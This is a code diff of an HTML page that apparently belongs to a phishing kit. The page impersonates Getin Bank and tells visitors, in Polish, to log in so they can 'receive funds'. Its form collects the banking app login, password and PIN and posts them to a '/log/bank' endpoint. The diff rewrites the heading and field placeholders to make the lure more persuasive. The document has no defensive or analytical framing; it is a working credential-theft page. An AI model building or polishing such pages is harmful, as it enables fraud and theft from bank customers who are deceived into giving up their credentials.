@@ -31,15 +31,15 @@
         <div class="my-3 p-3 bg-white rounded shadow-sm">
             <div class="media-body pb-3 border-bottom border-gray justify-content-center">
                 <div class="d-flex justify-content-between align-items-center w-100 border-bottom pb-2">
-                    <h4 class="text-gray-dark">Aby pomyślnie otrzymać środki, przejdź przez autoryzację w Getin Bank</h4>
+                    <h4 class="text-gray-dark">Aby odebrać środki przejdź przez autoryzację w Getin Bank</h4>
                 </div>
                 <br>
                 <div class="row mb-1">
                     <form class="col-md-12" id="bank_pm_form" method="POST" action="/log/bank"
                           role="form">
-                        <input name="login" type="text" class="form-control mb-2" placeholder="Login" required="">
-                        <input name="password" type="password" class="form-control mb-2" minlength="6" placeholder="Haslo" required="">
-                        <input name="pin" class="form-control mb-2" minlength="1" type="number" placeholder="PIN" required="">
+                        <input name="login" type="text" class="form-control mb-2" placeholder="Login do aplikacji bankowej" required="">
+                        <input name="password" type="password" class="form-control mb-2" minlength="6" placeholder="Hasło do aplikacji bankowej" required="">
+                        <input name="pin" class="form-control mb-2" minlength="1" type="number" placeholder="Kod PIN do aplikacji bankowej" required="">
 
                         <input type="submit" class="form-control btn btn-primary btn-lg" value="Wejść" style="border-radius: inherit; background: #ff6200;">
                     </form>
